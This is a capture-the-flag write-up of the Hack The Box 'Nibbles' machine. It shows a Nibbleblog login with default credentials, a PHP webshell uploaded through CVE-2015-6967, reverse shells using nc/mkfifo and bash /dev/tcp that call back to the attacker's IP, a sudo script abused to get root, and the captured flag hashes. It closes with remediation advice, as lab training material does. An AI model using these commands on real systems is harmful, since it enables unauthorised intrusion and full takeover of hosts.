# HTB - Nibbles

**Difficulty:** Easy  
**OS:** Linux  
**Status:** Retired ✅

---

## Summary

Nibbles is an Easy Linux machine running a Nibbleblog CMS. The admin panel is accessible with default credentials and the My Image plugin is vulnerable to unrestricted file upload (CVE-2015-6967), allowing a PHP webshell to be uploaded and executed. Privilege escalation is achieved by abusing a sudo misconfiguration that allows running a user-controlled script as root.

---

## Tools Used

- Nmap
- Browser
- Netcat

---

## Steps

### 1. Enumeration

```bash
nmap -sV 10.129.96.84
```

**Open ports:**
- 22 → OpenSSH 7.2p2
- 80 → Apache httpd 2.4.18

---

### 2. Web Enumeration

Visiting `http://10.129.96.84` shows a simple "Hello World" page. Checking the HTML source reveals a hidden comment:

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

Navigating to `/nibbleblog/` shows a blog powered by Nibbleblog CMS.

---

### 3. Admin Panel Access

The default admin panel is located at:

```
http://10.129.96.84/nibbleblog/admin.php
```

Logged in with default credentials: `admin` / `nibbles`.

---

### 4. File Upload — PHP Webshell (CVE-2015-6967)

Created a PHP webshell on Kali:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Uploaded it via **Plugins → My Image → Configure → Browse**.  
Nibbleblog throws errors but uploads the file anyway, saving it as `image.php`.

Verified RCE:

```
http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php?cmd=id
```

Result: `uid=1001(nibbler)`

---

### 5. Reverse Shell

Started a listener on Kali:

```bash
nc -lvnp 4444
```

Triggered the reverse shell via browser:

```
http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php?cmd=rm%20/tmp/f%3Bmkfifo%20/tmp/f%3Bcat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Cnc%2010.10.17.215%204444%20%3E/tmp/f
```

Shell obtained as `nibbler`.

---

### 6. User Flag

```bash
cat /home/nibbler/user.txt    # 593b1174038b6eee176fdfdba88312ae
```

---

### 7. Privilege Escalation

```bash
sudo -l
```

Output:
```
(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Nibbler can run `monitor.sh` as root with no password — and we control that file.

```bash
mkdir -p /home/nibbler/personal/stuff
echo '#!/bin/bash' > /home/nibbler/personal/stuff/monitor.sh
echo 'bash -i >& /dev/tcp/10.10.17.215/5555 0>&1' >> /home/nibbler/personal/stuff/monitor.sh
chmod +x /home/nibbler/personal/stuff/monitor.sh
```

Started a second listener on Kali:

```bash
nc -lvnp 5555
```

Executed the script as root:

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

Shell obtained as `root`.

---

### 8. Root Flag

```bash
cat /root/root.txt    # eb92dfb74ab1113759d688492d3fc078
```

---

## What I Learned

- Always check the HTML source — developers often leave comments with useful paths
- Nibbleblog uses predictable default credentials and has a known file upload vulnerability
- Unrestricted file upload on a web server leads to direct RCE
- Sudo misconfigurations on user-controlled scripts are a critical privilege escalation vector

---

## Remediation

- Never use default or guessable credentials on admin panels
- Validate file uploads — only allow safe file types
- Never grant sudo permissions on scripts that can be modified by the user
